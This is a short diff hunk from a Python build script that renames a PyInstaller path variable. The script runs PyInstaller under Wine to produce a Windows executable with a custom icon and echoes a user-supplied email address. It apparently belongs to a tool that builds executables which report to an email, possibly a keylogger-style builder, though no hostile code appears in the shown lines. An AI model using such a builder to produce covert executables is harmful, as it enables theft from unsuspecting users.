@@ -209,13 +209,13 @@ if __name__ == '__main__':
             if arguments.icon == "":
                 arguments.icon = "icon/exe.ico"     
             
-        if not os.path.exists(WINDOWS_PYTHON_PYINSTALLER_PATH.replace("wine ", "")) and arguments.windows:
-            WINDOWS_PYTHON_PYINSTALLER_PATH = get_python_pyinstaller_path()
-            if WINDOWS_PYTHON_PYINSTALLER_PATH == "UnableToFind":
+        if not os.path.exists(PYTHON_PYINSTALLER_PATH.replace("wine ", "")) and arguments.windows:
+            PYTHON_PYINSTALLER_PATH = get_python_pyinstaller_path()
+            if PYTHON_PYINSTALLER_PATH == "UnableToFind":
                 print(f'{RED}[!] Default Pyinstaller Path inside Wine Directory is Incorrect')
                 print(f'{RED}[!] {WHITE}[Please Update Line 19 Later] [{RED}DefautPath: {WHITE}~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe]')
-                WINDOWS_PYTHON_PYINSTALLER_PATH = "wine "
-                WINDOWS_PYTHON_PYINSTALLER_PATH += input(f'\n{WHITE}[?] Enter pyinstaller.exe path manually : ')            
+                PYTHON_PYINSTALLER_PATH = "wine "
+                PYTHON_PYINSTALLER_PATH += input(f'\n{WHITE}[?] Enter pyinstaller.exe path manually : ')            
         
         print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]{GREEN}')
         print(f'\n   {YELLOW}Email:{RED} ' + arguments.email)
